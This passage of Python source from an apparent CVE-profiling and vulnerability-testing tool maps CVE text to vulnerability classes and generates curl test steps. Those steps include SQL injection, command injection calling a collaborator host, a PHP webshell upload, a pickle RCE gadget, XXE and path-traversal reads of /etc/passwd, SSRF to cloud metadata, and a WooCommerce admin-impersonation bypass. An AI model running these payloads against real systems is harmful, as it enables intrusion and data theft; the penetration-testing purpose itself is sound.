class CveProfile:
    """Structured reasoning extracted from a CVE description — no NVD fields verbatim."""
    cve_id:         str
    vuln_class:     str              # "auth_bypass", "sqli", "rce", "path_traversal", …
    affected_component: str          # e.g. "kivicare", "next.js", "django"
    version_hint:   str              # e.g. "4.1.2", "<=13.5.6"
    auth_required:  bool             # True if exploitation requires prior auth
    endpoint_hint:  str              # e.g. "/wp-json/kivicare/v1/auth/patient/social-login"
    exploit_method: str              # brief one-line description
    confidence:     float            # 0.0–1.0 based on how much we could extract
    raw_description: str = ""


# Keyword → vuln class mapping (checked in order; first match wins)
_VULN_CLASS_PATTERNS: List[Tuple[str, str]] = [
    (r"\b(?:authentication bypass|auth bypass|bypass.{0,30}auth(?:entication)?|"
     r"unauthenticated.{0,30}access|without.{0,20}auth(?:entication)?)\b",
     "auth_bypass"),
    (r"\b(?:sql injection|sqli|sql.{0,10}inject)\b",                 "sqli"),
    (r"\b(?:remote code execution|rce|arbitrary code|code inject)\b", "rce"),
    (r"\b(?:path traversal|directory traversal|lfi|local file inclus)\b", "path_traversal"),
    (r"\b(?:cross.site scripting|xss|script inject)\b",              "xss"),
    (r"\b(?:server.side request forgery|ssrf)\b",                    "ssrf"),
    (r"\b(?:cross.site request forgery|csrf)\b",                     "csrf"),
    (r"\b(?:insecure deseri|deserializ)\b",                          "deserialization"),
    (r"\b(?:open redirect)\b",                                        "open_redirect"),
    (r"\b(?:file upload|arbitrary.{0,20}upload|webshell)\b",         "file_upload"),
    (r"\b(?:idor|insecure direct object|object reference)\b",        "idor"),
    (r"\b(?:privilege escalation|privesc|elevat.{0,20}privilege)\b", "privilege_escalation"),
    (r"\b(?:xxe|xml external entity)\b",                             "xxe"),
    (r"\b(?:broken.{0,20}access control|missing.{0,30}authorization|"
     r"lack.{0,20}(?:of\s+)?authorization)\b",                       "broken_access_control"),
]

# Auth-not-required signals
_NO_AUTH_PATTERNS = [
    r"\bunauthenticated\b",
    r"\bwithout.{0,20}(?:authentication|login|credential)\b",
    r"\bno.{0,10}(?:authentication|login|credential)\s+required\b",
    r"\banonymous\b",
    r"\bany.{0,10}(?:user|visitor|attacker)\b",
]

# Auth-required signals
_AUTH_REQUIRED_PATTERNS = [
    r"\b(?:authenticated|logged.{0,10}in|low.privilege|subscriber|contributor)\b",
    r"\bwith.{0,20}(?:authentication|valid.{0,10}account|low.{0,5}privilege)\b",
]


def _extract_endpoint_hint(text: str) -> str:
    """Find the most specific URL-like hint from a CVE description."""
    # REST path: /something/something
    for m in re.finditer(r"/(?:[a-zA-Z0-9_\-]+/){1,6}[a-zA-Z0-9_\-]*", text):
        p = m.group(0)
        if len(p) > 5 and p.count("/") >= 2:
            return p
    # Named endpoint hint
    for m in re.finditer(r"(?:endpoint|route|path|URL)[:\s]+(['\"/]?[^\s,;.\"\']{6,60})", text, re.I):
        return m.group(1).strip("'\"")
    return ""


def _extract_version_hint(text: str) -> str:
    """Find version constraints like '<=4.1.2', 'through 3.5', 'before 2.0.0'."""
    for pat in [
        r"(?:<=|<|through|prior to|before|up to)\s*v?(\d+\.\d+(?:\.\d+)?)",
        r"\bv?(\d+\.\d+(?:\.\d+)?)\s+(?:and earlier|and below|and prior)",
        r"\bversion\s+(\d+\.\d+(?:\.\d+)?)\b",
    ]:
        m = re.search(pat, text, re.I)
        if m:
            return m.group(1)
    return ""


class CveIntelligence:
    """
    Reasons about CVE descriptions to build a structured CveProfile.
    Uses cvelookup.fetch_cve() when network is available; falls back to
    description-only analysis when given raw text directly.
    """

    def profile_from_description(self, description: str, cve_id: str = "") -> CveProfile:
        """Extract structured CveProfile from free-text description alone."""
        text = description or ""
        lower = text.lower()

        # Classify vuln class
        vuln_class = "unknown"
        for pattern, cls in _VULN_CLASS_PATTERNS:
            if re.search(pattern, lower, re.I):
                vuln_class = cls
                break

        # Auth requirement
        no_auth = any(re.search(p, lower, re.I) for p in _NO_AUTH_PATTERNS)
        yes_auth = any(re.search(p, lower, re.I) for p in _AUTH_REQUIRED_PATTERNS)
        auth_required = yes_auth and not no_auth

        # Affected component: first quoted name, plugin name, or product name
        component = ""
        for pat in [
            r"(?:plugin|module|extension|package|library|component)\s+['\"]?([A-Za-z][A-Za-z0-9_\-\s]{2,30}?)['\"]?\s+(?:for|before|through|<=|plugin)",
            r"WordPress\s+plugin\s+['\"]?([^'\"<]{3,40}?)['\"]?\s+(?:before|through|<=|prior)",
            r"in\s+([A-Za-z][A-Za-z0-9_\-]{2,30})\s+(?:plugin|module|before|through|<=)",
        ]:
            m = re.search(pat, text, re.I)
            if m:
                component = m.group(1).strip().lower()
                break
        if not component:
            # Fallback: first capitalized product-looking word
            m = re.search(r"\b([A-Z][a-zA-Z0-9]{3,20}(?:\s[A-Z][a-zA-Z0-9]{2,20})?)\b", text)
            if m:
                component = m.group(1).lower()

        endpoint = _extract_endpoint_hint(text)
        version  = _extract_version_hint(text)

        # Confidence based on how much we extracted
        score = sum([
            vuln_class != "unknown",
            bool(component),
            bool(endpoint),
            bool(version),
        ]) / 4.0

        # Short exploit method summary
        method_map = {
            "auth_bypass":          "unauthenticated access via missing authorization check",
            "sqli":                 "SQL injection via unsanitized input parameter",
            "rce":                  "remote code execution via crafted input",
            "path_traversal":       "path traversal via directory sequence in parameter",
            "xss":                  "cross-site scripting via reflected/stored user input",
            "ssrf":                 "server-side request forgery via URL parameter",
            "csrf":                 "cross-site request forgery via forged request",
            "deserialization":      "insecure deserialization of untrusted data",
            "file_upload":          "arbitrary file upload bypassing extension/MIME filter",
            "idor":                 "insecure direct object reference via ID parameter",
            "broken_access_control":"missing authorization on sensitive endpoint",
        }
        exploit_method = method_map.get(vuln_class, "exploitation via crafted request")

        return CveProfile(
            cve_id=cve_id,
            vuln_class=vuln_class,
            affected_component=component,
            version_hint=version,
            auth_required=auth_required,
            endpoint_hint=endpoint,
            exploit_method=exploit_method,
            confidence=score,
            raw_description=text[:300],
        )

    def profile_from_nvd(self, cve_id: str, timeout: float = 20.0) -> Optional[CveProfile]:
        """Fetch CVE from NVD and return a structured CveProfile. Returns None on network error."""
        try:
            from binoracle.workflows.cvelookup import fetch_cve
            info = fetch_cve(cve_id, timeout=timeout, enrich=False)
            if not info.ok or not info.description:
                return None
            profile = self.profile_from_description(info.description, cve_id)
            # Override version from NVD CVSS when available
            if not profile.version_hint and info.cvss_vector:
                profile.confidence = min(1.0, profile.confidence + 0.1)
            return profile
        except Exception:
            return None

    def suggest_test_strategy(
        self,
        profile: "CveProfile",
        base_url: str = "http://TARGET",
    ) -> List["TestStep"]:
        """
        Given a CveProfile, return an ordered list of TestStep objects each with:
          - action: human-readable description
          - curl: a runnable curl command (placeholder base_url if not provided)
          - expected: what a successful hit looks like
          - order: execution sequence number

        Call enrich_profile_from_scan() first to get real endpoint_hint values.
        """
        ep = profile.endpoint_hint or "<endpoint>"
        # Normalise base_url — strip trailing slash
        base = base_url.rstrip("/")
        full_ep = f"{base}{ep}" if ep.startswith("/") else ep

        steps: List["TestStep"] = []
        seq = [0]

        def step(action: str, curl: str = "", expected: str = "") -> None:
            seq[0] += 1
            steps.append(TestStep(
                order=seq[0],
                action=action,
                curl=curl,
                expected=expected,
            ))

        if not profile.auth_required:
            step(
                "UNAUTHENTICATED — send all test requests without session cookies or auth headers",
                curl=f"curl -si '{full_ep}' -H 'Cookie:' | head -5",
                expected="HTTP 200 or error without redirecting to login",
            )

        vc = profile.vuln_class
        desc_lower = (profile.raw_description or "").lower()

        if vc == "auth_bypass":
            # Detect user-ID-impersonation pattern (WooCommerce Payments / similar):
            # "log in as any user", "knows the user id", "platform-checkout" in description
            _user_id_bypass = any(kw in desc_lower for kw in (
                "log in as any", "log in as an", "as any existing", "as any user",
                "knows the user id", "user_id", "platform-checkout", "impersonat",
                "gain access as an admin", "gain access as administrator",
                "as an administrator", "as any authenticated",
            ))
            if _user_id_bypass:
                step(
                    "Enumerate user IDs (admin is usually ID=1)",
                    curl=(f"curl -si '{base}/wp-json/wp/v2/users' | jq '.[].id'"),
                    expected="JSON array of user IDs; ID 1 is typically the administrator",
                )
                step(
                    "Send user ID via header to bypass authentication (WC Payments pattern)",
                    curl=(f"curl -si -X POST '{base}/wp-json/wc/store/v1/checkout' "
                          f"-H 'x-wcpay-platform-checkout-user: 1' "
                          f"-H 'x-wcpay-platform-checkout-nonce: <get_from_wc_checkout_js>' "
                          f"| grep -i 'Set-Cookie\\|is_admin\\|token'"),
                    expected="Set-Cookie with admin session, or response body confirming user 1 identity",
                )
                step(
                    "Confirm admin session on /wp-admin/profile.php",
                    curl=(f"curl -si '{base}/wp-admin/profile.php' "
                          f"-H 'Cookie: <captured_cookie>' | grep -i 'profile\\|admin'"),
                    expected="Profile page 200 (not redirect to /wp-login.php)",
                )
            else:
                step(
                    f"POST {ep} with minimal/dummy params (login_type, identifier, etc.)",
                    curl=(f"curl -si -X POST '{full_ep}' "
                          f"-H 'Content-Type: application/json' "
                          f"-d '{{\"login_type\":\"google\",\"password\":\"dummy\"}}' | head -20"),
                    expected="HTTP 200/403 body + Set-Cookie in response headers",
                )
                step(
                    "Inspect EVERY response (even 4xx) for Set-Cookie with auth tokens",
                    curl=(f"curl -si -X POST '{full_ep}' "
                          f"-d '{{\"login_type\":\"google\",\"password\":\"dummy\"}}' "
                          f"| grep -i set-cookie"),
                    expected="wordpress_logged_in_* or similar cookie",
                )
                step(
                    "If auth cookie received: GET /wp-admin/profile.php to confirm session",
                    curl=(f"curl -si '{base}/wp-admin/profile.php' "
                          f"-H 'Cookie: <captured_cookie>' | grep -i 'profile\\|admin'"),
                    expected="Profile page loads (200), not a redirect to /wp-login.php",
                )
            step(
                "Document: request → response body + cookies → /wp-admin/profile.php access",
                expected="Screenshot or response diff showing authenticated access",
            )

        elif vc == "sqli":
            # Detect ORDER BY context: parameter name suggests sorting, not filtering.
            _sqli_param = (profile.parameters or [""])[0] if profile.parameters else ""
            _orderby_ctx = any(kw in _sqli_param.lower() for kw in
                               ("sort", "order", "orderby", "dir", "asc", "desc"))
            if _orderby_ctx:
                step(
                    f"ORDER BY context — inject scalar subquery without quotes or AND/OR",
                    curl=(f"curl -si -X POST '{full_ep}' "
                          f"-d 'nonce=<real_nonce>&directory_id=<real_id>"
                          f"&{_sqli_param}=,(SELECT+extractvalue(1,concat(0x7e,version())))' "
                          f"| grep -Eo '[0-9]+\\.[0-9]+\\.[0-9]+-'"),
                    expected="MySQL version string in XPATH error (e.g. ~8.0.32-MySQL)",
                )
                step(
                    "ORDER BY time-based: CASE WHEN conditional (confirms injection, not just SLEEP accepted)",
                    curl=(f"time curl -si -X POST '{full_ep}' "
                          f"-d 'nonce=<real_nonce>&directory_id=<real_id>"
                          f"&{_sqli_param}=,(SELECT+CASE+WHEN+(1=1)+THEN+SLEEP(5)+ELSE+0+END)' "
                          f"| tail -2"),
                    expected="Response takes >=5 s (true case) vs <1 s for 1=2 (false case)",
                )
                step(
                    "NOTE — get a real nonce from the page that renders the directory shortcode",
                    curl=(f"curl -si '{base}/members-page/' | grep -o '\"nonce\":\"[^\"]*\"' | head -1"),
                    expected="JSON nonce value embedded in page source by UM plugin",
                )
            else:
                step(
                    f"Test {ep} with quote injection: ' OR '1'='1",
                    curl=(f"curl -si '{full_ep}' "
                          f"-G --data-urlencode \"search=' OR '1'='1\" | head -20"),
                    expected="SQL error message OR unexpected data in response",
                )
                step(
                    "Time-based blind: ' AND SLEEP(5)-- (MySQL) / ' AND pg_sleep(5)-- (Postgres)",
                    curl=(f"curl -si -w '\\ntime_total: %{{time_total}}\\n' '{full_ep}' "
                          f"-G --data-urlencode \"search=' AND SLEEP(5)--\""),
                    expected="Response time >= 5 seconds confirms MySQL blind injection",
                )
                step(
                    "UNION-based if errors visible: ' UNION SELECT NULL,version(),NULL--",
                    curl=(f"curl -si '{full_ep}' "
                          f"-G --data-urlencode \"search=' UNION SELECT NULL,version(),NULL--\" "
                          f"| grep -Eo '[0-9]+\\.[0-9]+\\.[0-9]+-'"),
                    expected="MySQL/Postgres version string in response body",
                )
            step(
                "sqlmap confirmation (do NOT run on production): sqlmap -u '<url>' --batch --level=2",
                curl=f"sqlmap -u '{full_ep}?search=1' --batch --level=2 --dbms=mysql",
                expected="sqlmap reports 'parameter is vulnerable'",
            )

        elif vc == "rce":
            step(
                f"Test {ep} with time-based OS command injection: ;sleep(5);",
                curl=(f"curl -si -w '\\ntime: %{{time_total}}\\n' -X POST '{full_ep}' "
                      f"-d 'cmd=;sleep+5;' | tail -3"),
                expected="Response delayed by ~5 seconds",
            )
            step(
                "Try SSTI if template engine suspected: {{7*7}} or ${{7*7}}",
                curl=(f"curl -si '{full_ep}' "
                      f"-G --data-urlencode \"q={{{{7*7}}}}\" | grep '49'"),
                expected="'49' in response body",
            )
            step(
                "Command injection via input field: $(id) or `id`",
                curl=(f"curl -si -X POST '{full_ep}' "
                      f"-d 'name=$(id)' | grep 'uid='"),
                expected="uid=33(www-data) or similar in response",
            )
            step(
                "Out-of-band confirmation: curl to interactsh/Burp Collaborator",
                curl=(f"curl -si -X POST '{full_ep}' "
                      f"-d 'name=$(curl+http://YOUR_COLLABORATOR_HOST/ping)'"),
                expected="HTTP request received at collaborator",
            )

        elif vc == "path_traversal":
            step(
                f"Test {ep} with: ../../../../etc/passwd",
                curl=(f"curl -si '{full_ep}' "
                      f"-G --data-urlencode 'file=../../../../etc/passwd' | grep 'root:'"),
                expected="root:x:0:0 in response — confirms LFI",
            )
            step(
                "URL-encoded traversal: ..%2F..%2F..%2Fetc%2Fpasswd",
                curl=(f"curl -si '{full_ep}?file=..%2F..%2F..%2F..%2Fetc%2Fpasswd' | grep root"),
                expected="root: in body",
            )
            step(
                "Double-encoding: ..%252F..%252F (bypasses single-decode filters)",
                curl=(f"curl -si '{full_ep}?file=..%252F..%252F..%252Fetc%252Fpasswd' | grep root"),
                expected="root: in body",
            )
            step(
                "Confirm with /proc/version or /etc/hostname (less flagged than /etc/passwd)",
                curl=(f"curl -si '{full_ep}' "
                      f"-G --data-urlencode 'file=../../../../proc/version' | grep -i linux"),
                expected="Linux kernel version string",
            )

        elif vc in ("idor", "broken_access_control"):
            step(
                "Enumerate accessible objects as user A (the attacker)",
                curl=(f"curl -si '{full_ep}' "
                      f"-H 'Cookie: <attacker_session>' | jq '.[] | .id'"),
                expected="List of IDs owned by attacker",
            )
            step(
                "Access user B's resource using attacker session but victim's ID",
                curl=(f"curl -si '{full_ep}/<victim_id>' "
                      f"-H 'Cookie: <attacker_session>'"),
                expected="HTTP 200 with victim's data (not 403/404)",
            )
            step(
                "Modify victim's resource to prove write access",
                curl=(f"curl -si -X PUT '{full_ep}/<victim_id>' "
                      f"-H 'Cookie: <attacker_session>' "
                      f"-d '{{\"field\":\"pwned_by_attacker\"}}' | head -5"),
                expected="HTTP 200 confirming modification",
            )

        elif vc == "xss":
            step(
                f"Test {ep} with reflected payload: <script>alert(1)</script>",
                curl=(f"curl -si '{full_ep}' "
                      f"-G --data-urlencode \"q=<script>alert(1)</script>\" | grep script"),
                expected="Payload reflected unescaped in response body",
            )
            step(
                "Try event-handler bypass: <img src=x onerror=alert(1)>",
                curl=(f"curl -si '{full_ep}' "
                      f"-G --data-urlencode \"q=<img src=x onerror=alert(1)>\" | grep onerror"),
                expected="onerror= attribute in unescaped form in response",
            )
            step(
                "For stored XSS: submit payload, then view it in a separate session",
                expected="Payload executes in second browser session (use Burp's render)",
            )
            step(
                "Confirm context: reflected / stored / DOM (determines severity)",
                expected="Screenshot of alert(1) execution or Burp Collaborator interaction",
            )

        elif vc == "ssrf":
            step(
                f"Test {ep} with internal metadata URL: http://169.254.169.254/",
                curl=(f"curl -si -X POST '{full_ep}' "
                      f"-d 'url=http://169.254.169.254/latest/meta-data/' | head -20"),
                expected="AWS/GCP/Azure metadata keys in response",
            )
            step(
                "Try localhost internal services: http://127.0.0.1:22/ and :6379/ (Redis)",
                curl=(f"curl -si -X POST '{full_ep}' "
                      f"-d 'url=http://127.0.0.1:6379/' | head -5"),
                expected="Redis banner or connection refused (confirms port scan)",
            )
            step(
                "Out-of-band via Burp Collaborator / interactsh",
                curl=(f"curl -si -X POST '{full_ep}' "
                      f"-d 'url=http://YOUR_COLLABORATOR_HOST/'"),
                expected="DNS + HTTP request at collaborator confirms blind SSRF",
            )

        elif vc == "deserialization":
            step(
                f"Test {ep} with PHP gadget chain (phpggc)",
                curl=(f"phpggc -o /tmp/payload.txt <Framework> RCE/CMD 'id' && "
                      f"curl -si '{full_ep}' "
                      f"-H 'Cookie: data=$(base64 -w0 /tmp/payload.txt)' | grep uid"),
                expected="uid=33(www-data) in response body",
            )
            step(
                "Python: test pickle deserialization vector",
                curl=(f"python3 -c \""
                      f"import pickle,base64,os; "
                      f"class E: __reduce__=lambda s: (os.system,('id',)); "
                      f"print(base64.b64encode(pickle.dumps(E())).decode())\" | "
                      f"xargs -I% curl -si '{full_ep}' -d 'data=%'"),
                expected="uid= output in server logs or response",
            )
            step(
                "Confirm with time-based: use sleep(5) as the command",
                expected="Response delayed by 5 seconds confirms RCE via deserialization",
            )

        elif vc == "file_upload":
            step(
                f"POST {ep} with a PHP webshell: shell.php",
                curl=(f"curl -si -X POST '{full_ep}' "
                      f"-F 'file=@/dev/stdin;filename=shell.php;type=application/octet-stream' "
                      f"<<< '<?php system($_GET[\"cmd\"]);?>' | head -10"),
                expected="HTTP 200 with upload confirmation and file URL",
            )
            step(
                "Try extension bypasses: shell.php.jpg, shell.pHp, shell.php%00.jpg",
                curl=(f"curl -si -X POST '{full_ep}' "
                      f"-F 'file=@shell.php;filename=shell.php.jpg'"),
                expected="Upload accepted; then access shell.php.jpg?cmd=id",
            )
            step(
                "After upload: find the file URL and confirm execution",
                curl=(f"curl -si '{base}/uploads/shell.php?cmd=id' | grep uid"),
                expected="uid=33(www-data) confirms webshell execution",
            )

        elif vc == "open_redirect":
            step(
                f"Test {ep} with absolute URL redirect: https://evil.com",
                curl=(f"curl -si '{full_ep}' "
                      f"-G --data-urlencode 'redirect_to=https://evil.com' | grep -i 'location:'"),
                expected="Location: https://evil.com confirms open redirect",
            )
            step(
                "Try URL-encoded payloads to bypass validation: https://%2Fevil.com, //evil.com",
                curl=(f"curl -si '{full_ep}?redirect_to=%2F%2Fevil.com' | grep -i location"),
                expected="Location header pointing to evil.com or unexpected external domain",
            )
            step(
                "Parameter name variants: next, url, return, returnUrl, back, goto",
                curl=(f"curl -si '{full_ep}' "
                      f"-G --data-urlencode 'next=https://evil.com' | grep -i location"),
                expected="Redirect to evil.com",
            )

        elif vc == "csrf":
            step(
                f"Verify {ep} has no CSRF nonce in the request",
                curl=(f"curl -si -X POST '{full_ep}' "
                      f"-H 'Origin: https://evil.com' "
                      f"-H 'Referer: https://evil.com/' "
                      f"-d 'email=attacker@evil.com' | head -10"),
                expected="HTTP 200 with action performed (email changed, settings saved, etc.)",
            )
            step(
                "Craft minimal HTML PoC to test from a browser",
                curl=(f"echo '<form method=POST action=\"{full_ep}\"><input name=email value=pwned@evil.com>"
                      f"<input type=submit></form>' > /tmp/csrf.html && open /tmp/csrf.html"),
                expected="Action completes without requiring nonce — CSRF confirmed",
            )

        elif vc == "xxe":
            step(
                f"Test {ep} with inline XML entity injection",
                curl=(f"curl -si -X POST '{full_ep}' "
                      f"-H 'Content-Type: application/xml' "
                      f"-d '<?xml version=\"1.0\"?><!DOCTYPE x [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><x>&xxe;</x>' "
                      f"| grep root"),
                expected="root:x:0:0 in response body — confirms XXE with LFI",
            )
            step(
                "Blind XXE via out-of-band: entity pointing to Collaborator",
                curl=(f"curl -si -X POST '{full_ep}' "
                      f"-H 'Content-Type: application/xml' "
                      f"-d '<?xml version=\"1.0\"?><!DOCTYPE x [<!ENTITY % xxe SYSTEM \"http://YOUR_COLLABORATOR_HOST/\">%xxe;]><x/>'"
                      ),
                expected="DNS/HTTP request at Collaborator confirms blind XXE",
            )

        else:
            step(
                f"Test {ep} with malformed/boundary input for each parameter",
                curl=f"curl -si '{full_ep}?param=' | head -20",
                expected="Unexpected error message or data disclosure",
            )
            step(
                "Compare authenticated vs unauthenticated responses",
                curl=(f"curl -si '{full_ep}' && "
                      f"curl -si '{full_ep}' -H 'Cookie: <valid_session>'"),
                expected="Different response bodies or status codes",
            )
            step(
                "Watch for information disclosure in error responses",
                expected="Stack traces, file paths, SQL errors, internal hostnames",
            )

        if profile.version_hint:
            step(
                f"NOTE — confirm target version is <= {profile.version_hint} before testing",
                curl=(f"curl -si '{base}/wp-login.php' | grep -i 'ver=' || "
                      f"curl -si '{base}/readme.html' | grep -i 'version'"),
                expected=f"Version string <= {profile.version_hint}",
            )
        if profile.affected_component:
            step(
                f"NOTE — verify {profile.affected_component} is installed/active",
                curl=(f"curl -si '{base}/wp-json/wp/v2/plugins' "
                      f"-H 'Authorization: Basic <admin_b64>' | jq '.[] | .plugin'"),
                expected=f"{profile.affected_component} in active plugins list",
            )

        return steps

    def enrich_profile_from_scan(
        self,
        profile: "CveProfile",
        findings: List["SecurityFinding"],
        source_dir: str = "",
    ) -> "CveProfile":
        """
        Cross-reference a CveProfile against live scan findings:
        — Fill endpoint_hint from REST routes found in source when description had none
        — Upgrade vuln_class from 'unknown' to a specific class when scan found matching sinks
        — Set auth_required=False when scan found public endpoints with no auth callback
        — Raise confidence when scan evidence corroborates the CVE description

        This is the glue between static analysis (VulnerabilityIntelligence) and
        CVE reasoning (CveIntelligence): call it after scan_for_vulnerabilities() to
        get a richer profile that suggest_test_strategy() can use with real endpoints.
        """
        import dataclasses as _dc

        # Map scan vuln_class → CVE vuln_class
        _scan_to_cve = {
            "sqli_string_concat_php": "sqli",
            "sqli_f_string_python": "sqli",
            "xss_echo_php": "xss",
            "xss_dom_innerHTML": "xss",
            "cmdi_php": "rce",
            "cmdi_python": "rce",
            "path_traversal": "path_traversal",
            "deserialization_php_user_input": "deserialization",
            "deserialization_python": "deserialization",
            "ssrf": "ssrf",
            "file_upload": "file_upload",
            "weak_crypto": "unknown",
            "hardcoded_credential": "unknown",
            "hardcoded_api_key": "unknown",
            "wp_rest_no_auth_required": "broken_access_control",
        }

        changes: Dict[str, Any] = {}

        # 1. Upgrade vuln_class from 'unknown' using scan evidence
        if profile.vuln_class == "unknown":
            for f in findings:
                mapped = _scan_to_cve.get(f.vuln_class)
                if mapped and mapped != "unknown":
                    changes["vuln_class"] = mapped
                    changes["confidence"] = max(profile.confidence, f.confidence * 0.8)
                    break

        # 2. Fill endpoint_hint from scan findings when profile has none.
        # Only use a wp_rest finding route when the profile's own vuln_class is access-control
        # related — not for injection CVEs whose actual endpoint is a different mechanism (e.g. AJAX).
        _access_control_classes = {
            "broken_access_control", "idor", "privilege_escalation", "unknown",
        }
        profile_vc = (changes.get("vuln_class") or profile.vuln_class or "").lower()
        endpoint_class_match = any(c in profile_vc for c in ("access", "idor", "auth", "unknown"))

        if not profile.endpoint_hint:
            if endpoint_class_match:
                # wp_rest findings now carry a .route field extracted from register_rest_route()
                for f in findings:
                    if "wp_rest" in f.vuln_class and f.route and "<ns>" not in f.route:
                        changes["endpoint_hint"] = f.route
                        break
                # Accept <ns> placeholder routes only if nothing better is available
                if "endpoint_hint" not in changes:
                    for f in findings:
                        if "wp_rest" in f.vuln_class and f.route:
                            changes["endpoint_hint"] = f.route
                            break
                # Fallback: check evidence strings for /wp-json/... patterns
                if "endpoint_hint" not in changes:
                    _route_re = re.compile(r"/wp-json/[A-Za-z0-9_/-]{5,60}")
                    for f in findings:
                        if "wp_rest" in f.vuln_class:
                            for ev in (f.evidence or []):
                                m = _route_re.search(str(ev))
                                if m:
                                    changes["endpoint_hint"] = m.group(0)
                                    break
                        if "endpoint_hint" in changes:
                            break

            # Fallback: check the location field — only use it if it IS a URL path
            # (starts with /, no file extension in the last segment).
            if "endpoint_hint" not in changes:
                sinks = [f for f in findings if f.vuln_class not in
                         ("hardcoded_credential", "hardcoded_api_key", "embedded_private_key")]
                for sf in sorted(sinks, key=lambda f: -f.confidence):
                    loc = (sf.location or "").split(":")[0]
                    last_seg = loc.rstrip("/").split("/")[-1]
                    is_url_path = (loc.startswith("/")
                                   and "." not in last_seg
                                   and not loc.endswith(".php")
                                   and not loc.endswith(".py"))
                    if is_url_path:
                        changes["endpoint_hint"] = loc
                        break
                # If still nothing, leave endpoint_hint empty — a file path is not an endpoint

        # 3. If scan found no-auth REST endpoints and profile says auth_required,
        #    lower the bar (the evidence says unauthenticated is possible)
        no_auth_findings = [f for f in findings if f.vuln_class == "wp_rest_no_auth_required"]
        if no_auth_findings and profile.auth_required:
            changes["auth_required"] = False

        # 4. Boost confidence when scan corroborates CVE vuln class
        same_class = [f for f in findings
                      if _scan_to_cve.get(f.vuln_class) == profile.vuln_class]
        if same_class and profile.confidence < 0.9:
            boost = min(0.15, 0.05 * len(same_class))
            changes["confidence"] = round(
                min(0.95, changes.get("confidence", profile.confidence) + boost), 2)

        if changes:
            return _dc.replace(profile, **changes)
        return profile


# ─────────────────────── 5. Dependency Analysis ───────────────────────────────

@dataclass
class DependencyRecord:
    """One package/library from a dependency manifest."""
    name:        str
    version:     str           # declared version string (may be a range)
    manager:     str           # "npm", "pip", "composer", "maven", "gem", "cargo", "go"
    source_file: str           # relative path of the manifest file
    dev_only:    bool = False  # true for devDependencies, test-only, etc.


@dataclass
class DependencyReport:
    dependencies: List[DependencyRecord]
    managers_found: List[str]
    source_dir: str


class DependencyAnalysis:
    """
    Parses dependency manifests from any ecosystem and returns a structured inventory.
    Supports: npm/yarn (package.json), pip (requirements.txt, pyproject.toml, setup.cfg),
    Composer (composer.json), Maven (pom.xml), Bundler (Gemfile.lock / Gemfile),
    Cargo (Cargo.toml), Go modules (go.mod).
    """

    def analyze(self, source_dir: str, max_depth: int = 4) -> DependencyReport:
        """Walk source_dir up to max_depth levels and parse all dependency manifests."""
        records: List[DependencyRecord] = []
        managers: List[str] = []

        for root, dirs, files in os.walk(source_dir):
            # Limit depth
            depth = root[len(source_dir):].count(os.sep)
            if depth >= max_depth:
                dirs.clear()
                continue
            # Skip common non-source dirs
            dirs[:] = [d for d in dirs if d not in
                       ("node_modules", ".git", "vendor", "__pycache__", ".venv", "venv",
                        "dist", "build", "target", ".tox", "eggs", ".eggs")]

            for fname in files:
                fpath = os.path.join(root, fname)
                rel   = os.path.relpath(fpath, source_dir)
                try:
                    new = self._parse_file(fpath, rel, fname)
                except Exception:
                    new = []
                for rec in new:
                    records.append(rec)
                    if rec.manager not in managers:
                        managers.append(rec.manager)

        return DependencyReport(
            dependencies=records,
            managers_found=managers,
            source_dir=source_dir,
        )

    # Small hardcoded DB of packages with known high-severity CVEs.
    _KNOWN_VULNS: List[Tuple[str, str, str, str, str]] = [
        ("npm",      "axios",                        "0.",    "CVE-2023-45857",  "ssrf"),
        ("npm",      "lodash",                       "4.17.", "CVE-2021-23337",  "command_injection"),
        ("npm",      "node-fetch",                   "2.",    "CVE-2022-0235",   "ssrf"),
        ("npm",      "jsonwebtoken",                 "8.",    "CVE-2022-23529",  "auth_bypass"),
        ("npm",      "express",                      "4.17.", "CVE-2022-24999",  "path_traversal"),
        ("pip",      "pillow",                       "9.",    "CVE-2023-44271",  "ssrf"),
        ("pip",      "flask",                        "2.2.",  "CVE-2023-25577",  "path_traversal"),
        ("pip",      "cryptography",                 "41.0.", "CVE-2023-49083",  "deserialization"),
        ("pip",      "requests",                     "2.28.", "CVE-2023-32681",  "ssrf"),
        ("pip",      "pyyaml",                       "5.",    "CVE-2020-14343",  "deserialization"),
        ("composer", "guzzlehttp/guzzle",             "7.4.", "CVE-2022-31090",  "ssrf"),
        ("composer", "symfony/http-foundation",       "5.",   "CVE-2021-41267",  "path_traversal"),
        ("composer", "laravel/framework",             "8.",   "CVE-2021-3129",   "rce"),
        ("gem",      "rails",                        "6.",    "CVE-2022-32224",  "deserialization"),
        ("gem",      "nokogiri",                     "1.13.", "CVE-2022-29181",  "xxe"),
    ]

    # OSV ecosystem mapping
    _OSV_ECOSYSTEM: Dict[str, str] = {
        "npm": "npm", "pip": "PyPI", "composer": "Packagist",
        "gem": "RubyGems", "cargo": "crates.io", "go": "Go",
        "maven": "Maven",
    }

    def _query_osv_batch(self, queries: List[Dict]) -> List[List[Dict]]:
        """
        Batch-query OSV.dev (/v1/querybatch) for a list of {name, ecosystem, version} dicts.
        Returns a parallel list of vuln lists (empty list = no vulns or query failed).
        Much faster than individual queries: one round-trip for all packages.
        """
        if not queries:
            return []
        try:
            import urllib.request, json as _json
            payload = _json.dumps({
                "queries": [
                    {
                        "version": q["version"].lstrip("^~>="),
                        "package": {"name": q["name"], "ecosystem": q["ecosystem"]},
                    }
                    for q in queries
                ]
            }).encode()
            req = urllib.request.Request(
                "https://api.osv.dev/v1/querybatch",
                data=payload, method="POST",
                headers={"Content-Type": "application/json"},
            )
            with urllib.request.urlopen(req, timeout=10) as resp:
                data = _json.loads(resp.read())
            results = data.get("results", [])
            # results is a list of {"vulns": [...]} or {} — align to queries length
            return [r.get("vulns", []) for r in results] + [[] for _ in range(len(queries) - len(results))]
        except Exception:
            return [[] for _ in queries]

    @staticmethod
    def _osv_vuln_class(vuln: dict) -> str:
        """Best-effort vuln class from OSV vuln data (summary, details, severity types)."""
        # Combine all text sources: summary, details, and database_specific severity strings
        text_sources = [
            vuln.get("summary", ""),
            vuln.get("details", ""),
        ]
        for sev in vuln.get("severity", []):
            text_sources.append(sev.get("score", ""))
        combined = " ".join(text_sources).lower()

        # Map keyword → vuln_class (order matters: more specific first)
        for kw, vc in (
            ("sql injection",           "sqli"),
            ("sql-injection",           "sqli"),
            ("sqli",                    "sqli"),
            ("remote code exec",        "rce"),
            ("command inject",          "rce"),
            ("arbitrary code",          "rce"),
